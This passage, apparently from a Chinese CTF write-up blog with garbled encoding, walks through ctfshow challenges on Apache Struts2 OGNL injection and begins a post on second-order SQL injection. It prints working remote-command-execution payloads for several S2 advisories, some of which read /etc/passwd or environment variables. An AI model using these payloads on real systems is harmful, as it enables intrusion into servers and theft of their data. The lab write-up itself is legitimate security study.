Blanshardå¼€å‘çš„ï¼Œä¸»è¦ç”¨äºJavaçš„å¯¹è±¡å±æ€§è®¿é—®å’Œä¿®æ”¹ï¼Œç±»ä¼¼äºå…¶ä»–è¡¨è¾¾å¼è¯­è¨€å¦‚JSTLã€ELç­‰ã€‚OGNLè¡¨è¾¾å¼å¯ä»¥ç”¨æ¥ç®€åŒ–å¯¹å¤æ‚å¯¹è±¡ç»“æ„çš„è®¿é—®å’Œæ“ä½œï¼Œéå¸¸é€‚åˆäºMVCæ¡†æ¶ä¸­ç»‘å®šè¡¨å•æ•°æ®åˆ°æ¨¡å‹å¯¹è±¡çš„åœºæ™¯</span><br></pre></td></tr></table></figure><h3 id="OGNL-è¡¨è¾¾å¼çš„åŸºæœ¬åŠŸèƒ½"><a href="#OGNL-è¡¨è¾¾å¼çš„åŸºæœ¬åŠŸèƒ½" class="headerlink" title="OGNL è¡¨è¾¾å¼çš„åŸºæœ¬åŠŸèƒ½"></a>OGNL è¡¨è¾¾å¼çš„åŸºæœ¬åŠŸèƒ½</h3><ol><li><ol><li><strong>å¯¹è±¡å±æ€§è®¿é—®</strong>ï¼šä½¿ç”¨<code>.</code>ï¼ˆç‚¹å·ï¼‰è®¿é—®å¯¹è±¡çš„å±æ€§ã€‚ä¾‹å¦‚ï¼Œ<code>person.name</code> å¯ä»¥è·å–<code>person</code>å¯¹è±¡çš„<code>name</code>å±æ€§ã€‚</li><li><strong>é›†åˆå’Œæ•°ç»„è®¿é—®</strong>ï¼šOGNL æ”¯æŒé€šè¿‡ç´¢å¼•è®¿é—®é›†åˆå’Œæ•°ç»„ä¸­çš„å…ƒç´ ã€‚ä¾‹å¦‚ï¼Œ<code>list[0]</code> å¯ä»¥è®¿é—®åˆ—è¡¨ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</li><li><strong>æ–¹æ³•è°ƒç”¨</strong>ï¼šOGNL å¯ä»¥è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œ<code>person.getName()</code> å¯ä»¥è°ƒç”¨<code>person</code>å¯¹è±¡çš„<code>getName()</code>æ–¹æ³•ã€‚</li><li><strong>æ“ä½œç¬¦æ”¯æŒ</strong>ï¼šOGNL æ”¯æŒå¤šç§æ“ä½œç¬¦ï¼Œä¾‹å¦‚ç®—æœ¯æ“ä½œç¬¦ï¼ˆ<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>ï¼‰ï¼Œé€»è¾‘æ“ä½œç¬¦ï¼ˆ<code>&amp;&amp;</code>, <code>||</code>ï¼‰ï¼Œæ¯”è¾ƒæ“ä½œç¬¦ï¼ˆ<code>==</code>, <code>!=</code>, <code>&gt;</code>, <code>&lt;</code>ï¼‰ç­‰ã€‚</li><li><strong>ä¸Šä¸‹æ–‡å˜é‡</strong>ï¼šOGNL æ”¯æŒé€šè¿‡ <code>#</code> è®¿é—®ä¸Šä¸‹æ–‡å˜é‡ã€‚ä¾‹å¦‚ï¼Œ<code>#root</code> è®¿é—®å½“å‰çš„æ ¹å¯¹è±¡ï¼Œ<code>#this</code> è®¿é—®å½“å‰çš„å¯¹è±¡ã€‚</li><li><strong>è¡¨è¾¾å¼æ±‚å€¼</strong>ï¼šå¯ä»¥ä½¿ç”¨OGNLè¡¨è¾¾å¼ç›´æ¥æ±‚å€¼æˆ–è¿›è¡Œå¤æ‚çš„é€»è¾‘è¿ç®—ã€‚</li></ol></li></ol><p>æˆ‘ä»¬åœ¨è¿™é‡Œç®€å•çš„äº†è§£ä¸‹è¿™ä¸ªè¡¨è¾¾å¼</p><p>å¦‚ä½•åˆ†è¾¨è¿™ç§ç±»å‹çš„æ¼æ´çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.å¸¸è§çš„action.doåç¼€ç»“å°¾</span><br><span class="line">2.user!list.actionå¸¦æ„Ÿå¹å·å¼</span><br><span class="line">3.test?actionErrors=11111111111404/500å“åº”å¹¶ç›®é¡µé¢æ‰“å°11111111111</span><br><span class="line">4.åç¼€ä¸å¸¦action doï¼Œä¸èƒ½è¯´æ˜ä¸æ˜¯struts2</span><br></pre></td></tr></table></figure><p>s2-001æ˜¯ä¸€ä¸ªstruts2å‘½ä»¤æ‰§è¡Œæ¼æ´ç¼–å·ï¼Œæ¼æ´ä»‹ç»ï¼š<a href="https://www.freebuf.com/column/224041.html">https://www.freebuf.com/column/224041.html</a></p><p>æ¼æ´éƒ¨åˆ†ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">translateVariables</span><span class="params">(<span class="type">char</span> open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> expression.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> start + <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                ++count;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                --count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> x - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span> || end == -<span class="number">1</span> || count != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">var</span> <span class="operator">=</span> expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">        <span class="keyword">if</span> (evaluator != <span class="literal">null</span>) &#123;</span><br><span class="line">            o = evaluator.evaluate(o);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">left</span> <span class="operator">=</span> expression.substring(<span class="number">0</span>, start);</span><br><span class="line">        <span class="type">String</span> <span class="variable">right</span> <span class="operator">=</span> expression.substring(end + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(left)) &#123;</span><br><span class="line">                result = left + o;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                result = o;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                result = result + right;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            expression = left + o + right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = left + right;</span><br><span class="line">            expression = left + right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//è¿™æ®µä»£ç çš„æ ¸å¿ƒæµç¨‹å°±æ˜¯ä¸æ–­åœ¨ expression ä¸­æŸ¥æ‰¾å ä½ç¬¦ &#123;&#125;ï¼Œè§£æå˜é‡å¹¶æ›¿æ¢æˆå¯¹åº”çš„å€¼ã€‚å¦‚æœæä¾›äº† evaluatorï¼Œè¿˜ä¼šå¯¹æ‰¾åˆ°çš„å€¼è¿›ä¸€æ­¥å¤„ç†ã€‚æœ€ç»ˆè¿”å›çš„ç»“æœæ˜¯æ›¿æ¢åçš„å®Œæ•´å­—ç¬¦ä¸²æˆ–å¯¹è±¡ï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ®éœ€è¦è½¬æ¢æˆæŒ‡å®šç±»å‹ã€‚</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);<span class="comment">//å°è¯•åœ¨å­—ç¬¦ä¸² expression ä¸­æ‰¾åˆ°ä¸€ä¸ªå¤åˆå­—ç¬¦ä¸²çš„èµ·å§‹ä½ç½®ï¼Œè¯¥å¤åˆå­—ç¬¦ä¸²æ˜¯ç”±å˜é‡ open å’Œ &quot;&#123;&quot; ç»„åˆè€Œæˆçš„ã€‚</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br></pre></td></tr></table></figure><p>ç®€å•æ¥è¯´å°±æ˜¯ä½ è¾“å‡ºç»™passwordçš„æ˜¯OGNL è¡¨è¾¾å¼ è¿™æ ·ä¸€å¤§ä¸²ä»£ç ä¼šç›´æ¥æ‰§è¡Œä½ çš„ä»£ç </p><p>ä¾‹å¦‚æˆ‘ä»¬æ‰§è¡Œä¸€ä¸ª**%{1-1}**</p><p>å‘ç°å›æ˜¾ä¸€ä¸ª0</p><p>æ ¹æ®ä¸Šé¢çš„OGNL è¡¨è¾¾çš„ç”¨æ³•ï¼ˆç”¨ä¸‹wpçš„payloadï¼‰å‚è€ƒï¼š<a href="https://blog.csdn.net/q20010619/article/details/120729447">https://blog.csdn.net/q20010619/article/details/120729447</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// è·å–tomcatè·¯å¾„</span><br><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br><span class="line"></span><br><span class="line">// è·å–webè·¯å¾„</span><br><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#response.println(#req.getRealPath(&#x27;/&#x27;)),#response.flush(),#response.close()&#125;</span><br><span class="line"></span><br><span class="line">// å‘½ä»¤æ‰§è¡Œ envï¼Œflagå°±åœ¨å…¶ä¸­</span><br><span class="line">password=%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;&amp;username=1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_11.png"></p><h2 id="web280"><a href="#web280" class="headerlink" title="web280"></a>web280</h2><p>è¿™ä¸ªæ¼æ´æœ‰ä¸ªæ£€æµ‹å·¥å…·å</p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/abc123info/Struts2VulsScanTools/releases">https://github.com/abc123info/Struts2VulsScanTools/releases</a></p><p>S2-003</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Struts2å°†HTTPçš„æ¯ä¸ªå‚æ•°åè§£æä¸ºognlè¯­å¥æ‰§è¡Œ,è€Œognlè¡¨è¾¾å¼æ˜¯é€šè¿‡#æ¥è®¿é—®strutsçš„å¯¹è±¡ï¼ŒStruts2æ¡†æ¶è™½ç„¶è¿‡æ»¤äº†#æ¥è¿›è¡Œè¿‡æ»¤ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡unicodeç¼–ç ï¼ˆu0023ï¼‰æˆ–8è¿›åˆ¶ï¼ˆ43ï¼‰ç»•è¿‡äº†å®‰å…¨é™åˆ¶ï¼Œè¾¾åˆ°ä»£ç æ‰§è¡Œçš„æ•ˆæœ</span><br><span class="line"></span><br><span class="line">å½±å“ç‰ˆæœ¬ï¼šStruts 2.0.0 - Struts 2.0.11.2</span><br></pre></td></tr></table></figure><p>S2-005</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">S2-005å’ŒS2-003çš„åŸç†æ˜¯ç±»ä¼¼çš„ï¼Œå› ä¸ºå®˜æ–¹åœ¨ä¿®è¡¥S2-003ä¸å…¨é¢ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥ç»•è¿‡å®˜æ–¹çš„å®‰å…¨é…ç½®ï¼ˆç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨å’Œç±»æ–¹æ³•æ‰§è¡Œï¼‰ï¼Œå†æ¬¡é€ æˆçš„æ¼æ´ï¼Œå¯ä»¥è¯´æ˜¯å‡çº§ç‰ˆçš„S2-005æ˜¯å‡çº§ç‰ˆçš„S2-003</span><br></pre></td></tr></table></figure><p>Struts2æ¡†æ¶åœ¨å¤„ç†è¡¨å•æ•°æ®æ—¶ï¼Œä¼šå°†è¡¨å•æ•°æ®ç»‘å®šåˆ°Actionå¯¹è±¡çš„ç›¸åº”å±æ€§ä¸Šã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨è¡¨å•ä¸­æäº¤ç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œä»è€Œç»•è¿‡Struts2çš„å®‰å…¨è¿‡æ»¤æœºåˆ¶ï¼Œç›´æ¥æ‰§è¡Œä»»æ„ä»£ç </p><p>å·¥å…·å±•ç¤º</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_17.png"></p><h2 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h2><p>å·¥å…·è§£å†³å³å¯</p><p>äº†è§£ä¸‹æ¼æ´S2-007</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å½“ç”¨æˆ·æäº¤ age ä¸ºå­—ç¬¦ä¸²è€Œéæ•´å½¢æ•°å€¼æ—¶ï¼Œåç«¯ç”¨ä»£ç æ‹¼æ¥ &quot;&#x27;&quot; + value + &quot;&#x27;&quot; ç„¶åå¯¹å…¶è¿›è¡Œ OGNL è¡¨è¾¾å¼è§£æã€‚è¦æˆåŠŸåˆ©ç”¨ï¼Œåªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªé…ç½®äº†ç±»ä¼¼éªŒè¯è§„åˆ™çš„è¡¨å•å­—æ®µä½¿ä¹‹è½¬æ¢å‡ºé”™ï¼Œå€ŸåŠ©ç±»ä¼¼ SQLi æ³¨å…¥å•å¼•å·æ‹¼æ¥çš„æ–¹å¼å³å¯æ³¨å…¥ä»»æ„ OGNL è¡¨è¾¾å¼ã€‚</span><br></pre></td></tr></table></figure><p>age æ¡†æ‰§è¡Œäº†å‘½ä»¤</p><h2 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h2><p>S2-008 æ¶‰åŠå¤šä¸ªæ¼æ´ï¼ŒCookie æ‹¦æˆªå™¨é”™è¯¯é…ç½®å¯é€ æˆ OGNL è¡¨è¾¾å¼æ‰§è¡Œï¼Œä½†æ˜¯ç”±äºå¤§å¤š Web å®¹å™¨ï¼ˆå¦‚ Tomcatï¼‰å¯¹ Cookie åç§°éƒ½æœ‰å­—ç¬¦é™åˆ¶ï¼Œä¸€äº›å…³é”®å­—ç¬¦æ— æ³•ä½¿ç”¨ä½¿å¾—è¿™ä¸ªç‚¹æ˜¾å¾—æ¯”è¾ƒé¸¡è‚‹ã€‚å¦ä¸€ä¸ªæ¯”è¾ƒé¸¡è‚‹çš„ç‚¹å°±æ˜¯åœ¨ struts2 åº”ç”¨å¼€å¯ devMode æ¨¡å¼åä¼šæœ‰å¤šä¸ªè°ƒè¯•æ¥å£èƒ½å¤Ÿç›´æ¥æŸ¥çœ‹å¯¹è±¡ä¿¡æ¯æˆ–ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œæ­£å¦‚ kxlzx æ‰€æè¿™ç§æƒ…å†µåœ¨ç”Ÿäº§ç¯å¢ƒä¸­å‡ ä¹ä¸å¯èƒ½å­˜åœ¨ï¼Œå› æ­¤å°±å˜å¾—å¾ˆé¸¡è‚‹çš„ï¼Œä½†æˆ‘è®¤ä¸ºä¹Ÿä¸æ˜¯ç»å¯¹çš„ï¼Œä¸‡ä¸€è¢«é»‘äº†ä¸“é—¨ä¸¢äº†ä¸€ä¸ªå¼€å¯äº† debug æ¨¡å¼çš„åº”ç”¨åˆ°æœåŠ¡å™¨ä¸Šä½œä¸ºåé—¨ä¹Ÿæ˜¯æœ‰å¯èƒ½çš„ã€‚<br>å§¿åŠ¿1ï¼šcookie</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie:(&#x27;#_memberAccess.setAllowStaticMethodAccess(true)&#x27;)(1)(2)=Aluvion; (&#x27;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#x27;)(1)(2)=Twings;</span><br></pre></td></tr></table></figure><p>å§¿åŠ¿2ï¼šè°ƒè¯•æ¨¡å¼</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29)</span><br></pre></td></tr></table></figure><h2 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h2><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_18.png"></p><p>æ¼æ´åŸç†ï¼š</p><p>Struts2å¯¹s2-003çš„ä¿®å¤æ–¹æ³•æ˜¯ç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨ï¼Œåœ¨s2-005ä¸­å¯ç›´æ¥é€šè¿‡OGNLç»•è¿‡è¯¥é™åˆ¶ï¼Œå¯¹äº#å·ï¼ŒåŒæ ·ä½¿ç”¨ç¼–ç \u0023æˆ–\43è¿›è¡Œç»•è¿‡ï¼›äºæ˜¯Struts2å¯¹s2-005çš„ä¿®å¤æ–¹æ³•æ˜¯ç¦æ­¢\ç­‰ç‰¹æ®Šç¬¦å·ï¼Œä½¿ç”¨æˆ·ä¸èƒ½æäº¤åæ–œçº¿ã€‚</p><p>ä½†æ˜¯ï¼Œå¦‚æœå½“å‰actionä¸­æ¥å—äº†æŸä¸ªå‚æ•°exampleï¼Œè¿™ä¸ªå‚æ•°å°†è¿›å…¥OGNLçš„ä¸Šä¸‹æ–‡ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†OGNLè¡¨è¾¾å¼æ”¾åœ¨exampleå‚æ•°ä¸­ï¼Œç„¶åä½¿ç”¨&#x2F;helloword.acton?example&#x3D;<OGNL statement>&amp;(example)(â€˜xxxâ€™)&#x3D;1çš„æ–¹æ³•æ¥æ‰§è¡Œå®ƒï¼Œä»è€Œç»•è¿‡å®˜æ–¹å¯¹#ã€\ç­‰ç‰¹æ®Šå­—ç¬¦çš„é˜²å¾¡ã€‚</p><p>è®¿é—®<a href="http://your-ip:8080/ajax/example5.action%E5%8D%B3%E5%8F%AF%E8%AE%BF%E9%97%AE%E8%AF%A5%E6%8E%A7%E5%88%B6%E5%99%A8%E3%80%82%E6%8C%89%E7%85%A7%E5%8E%9F%E7%90%86%E4%B8%AD%E8%AF%B4%E5%88%B0%E7%9A%84%E6%96%B9%E6%B3%95%EF%BC%8C%E5%B0%86OGNL%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E6%94%BE%E5%9C%A8name%E5%8F%82%E6%95%B0%E9%87%8C">http://your-ip:8080/ajax/example5.actionå³å¯è®¿é—®è¯¥æ§åˆ¶å™¨ã€‚æŒ‰ç…§åŸç†ä¸­è¯´åˆ°çš„æ–¹æ³•ï¼Œå°†OGNLåˆ©ç”¨ä»£ç æ”¾åœ¨nameå‚æ•°é‡Œ</a></p><p>poc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?age=12313&amp;name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&amp;z[%28name%29%28%27meh%27%29]=true</span><br></pre></td></tr></table></figure><p>å·¥å…·ç›´æ¥å‡º</p><h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><p>ç”±urlå¯ä»¥å¾—çŸ¥æ¼æ´æ˜¯S2-012</p><p>æ¼æ´åŸç†ï¼š</p><p>å¦‚æœåœ¨é…ç½® Action ä¸­ Result æ—¶ä½¿ç”¨äº†é‡å®šå‘ç±»å‹ï¼Œå¹¶ä¸”è¿˜ä½¿ç”¨ ${param_name} ä½œä¸ºé‡å®šå‘å˜é‡ï¼Œä¾‹å¦‚ï¼šã€</p><package name="S2-012" extends="struts-default">    <action name="user" class="com.demo.action.UserAction">        <result name="redirect" type="redirect">/index.jsp?name=${name}</result>        <result name="input">/index.jsp</result>        <result name="success">/index.jsp</result>    </action></package>è¿™é‡Œ UserAction ä¸­å®šä¹‰æœ‰ä¸€ä¸ª name å˜é‡ï¼Œå½“è§¦å‘ redirect ç±»å‹è¿”å›æ—¶ï¼ŒStruts2 è·å–ä½¿ç”¨ ${name} è·å–å…¶å€¼ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šå¯¹ name å‚æ•°çš„å€¼æ‰§è¡Œ OGNL è¡¨è¾¾å¼è§£æï¼Œä»è€Œå¯ä»¥æ’å…¥ä»»æ„ OGNL è¡¨è¾¾å¼å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚<p>pocï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;, &quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><p>Struts2 æ ‡ç­¾ä¸­ &lt;s:a&gt; å’Œ &lt;s:url&gt; éƒ½åŒ…å«ä¸€ä¸ª includeParams å±æ€§ï¼Œå…¶å€¼å¯è®¾ç½®ä¸º noneï¼Œget æˆ– allï¼Œå‚è€ƒå®˜æ–¹å…¶å¯¹åº”æ„ä¹‰å¦‚ä¸‹ï¼š</p><p>none - é“¾æ¥ä¸åŒ…å«è¯·æ±‚çš„ä»»æ„å‚æ•°å€¼ï¼ˆé»˜è®¤ï¼‰<br>get - é“¾æ¥åªåŒ…å« GET è¯·æ±‚ä¸­çš„å‚æ•°å’Œå…¶å€¼<br>all - é“¾æ¥åŒ…å« GET å’Œ POST æ‰€æœ‰å‚æ•°å’Œå…¶å€¼<br>&lt;s:a&gt;ç”¨æ¥æ˜¾ç¤ºä¸€ä¸ªè¶…é“¾æ¥ï¼Œå½“includeParams&#x3D;allçš„æ—¶å€™ï¼Œä¼šå°†æœ¬æ¬¡è¯·æ±‚çš„GETå’ŒPOSTå‚æ•°éƒ½æ”¾åœ¨URLçš„GETå‚æ•°ä¸Šã€‚åœ¨æ”¾ç½®å‚æ•°çš„è¿‡ç¨‹ä¸­ä¼šå°†å‚æ•°è¿›è¡ŒOGNLæ¸²æŸ“ï¼Œé€ æˆä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚<br>pocï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())&#125;</span><br><span class="line"></span><br><span class="line">// æˆ–</span><br><span class="line"></span><br><span class="line">$&#123;#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())&#125;</span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰å·¥å…·éƒ½èƒ½ç›´æ¥å†™å‡ºæ¥ åé¢çš„å°±ä¸å†™äº†</p><h1 id="web295-S2-048"><a href="#web295-S2-048" class="headerlink" title="web295:S2-048"></a>web295:S2-048</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">poc:%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF</title>
      <link href="/2024/08/09/BUUCTF/"/>
      <url>/2024/08/09/BUUCTF/</url>
      
        <content type="html"><![CDATA[<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œåº”è¯¥è¦å…ˆæ³¨å†Œè¿›å…¥</p><p>éšä¾¿æ³¨å†Œ</p><p>è¿›å…¥å‘ç°å¯ä»¥ä¿®æ”¹å¯†ç  ç¬¬ä¸€æƒ³æ³•å°±æ˜¯äºŒæ¬¡æ³¨å…¥</p><h2 id="ä»€ä¹ˆæ˜¯äºŒæ¬¡æ³¨å…¥"><a href="#ä»€ä¹ˆæ˜¯äºŒæ¬¡æ³¨å…¥" class="headerlink" title="ä»€ä¹ˆæ˜¯äºŒæ¬¡æ³¨å…¥"></a>ä»€ä¹ˆæ˜¯äºŒæ¬¡æ³¨å…¥</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/jackie-lee/p/16124022.html">https://www.cnblogs.com/jackie-lee/p/16124022.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">äºŒæ¬¡æ³¨å…¥å¯ä»¥ç†è§£ä¸ºï¼Œæ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“åï¼Œ**æ¶æ„æ•°æ®è¢«è¯»å–å¹¶è¿›å…¥åˆ°SQLæŸ¥è¯¢è¯­å¥**æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚é˜²å¾¡è€…å³ä½¿å¯¹ç”¨æˆ·è¾“å…¥çš„æ¶æ„æ•°æ®è¿›è¡Œè½¬ä¹‰ï¼Œå½“æ•°æ®æ’å…¥åˆ°æ•°æ®åº“ä¸­æ—¶è¢«å¤„ç†çš„æ•°æ®åˆè¢«è¿˜åŸï¼ŒWebç¨‹åºè°ƒç”¨å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚</span><br><span class="line"></span><br><span class="line">ä¹Ÿå°±æ˜¯è¯´ä¸€æ¬¡æ”»å‡»é€ æˆä¸äº†ä»€ä¹ˆï¼Œä½†æ˜¯ä¸¤æ¬¡é…åˆèµ·æ¥å°±ä¼šé€ æˆæ³¨å…¥æ¼æ´ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQLäºŒæ¬¡æ³¨å…¥ï¼ŒæŒ‡çš„æ˜¯åœ¨æœ‰äº›åº”ç”¨åœºæ™¯ä¸‹ï¼Œæˆ‘ä»¬å…ˆæŠŠSQLæ³¨å…¥çš„payloadå†™å…¥åˆ°ç›®æ 